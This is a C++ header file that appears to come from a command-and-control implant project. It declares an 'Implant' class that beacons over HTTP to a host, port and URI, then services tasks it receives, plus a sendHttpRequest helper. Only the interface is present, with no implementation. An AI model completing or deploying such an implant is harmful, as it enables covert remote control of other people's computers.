#pragma once

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

class Implant {
    public:
        // Our implant constructor
        Implant(std::string host, std::string port, std::string uri);
        // The thread for servicing tasks
        std::future<void> task_thread;
        // Our public functions that the implant exposes
        void beacon();
        void set_running(bool isRunning);
        void service_tasks();

    private:
	    const std::string host, port, uri;
        bool is_running;

        void parse_response(const std::string& response);
};

std::string sendHttpRequest(std::string host,
    std::string port,
    std::string uri,
    std::string payload);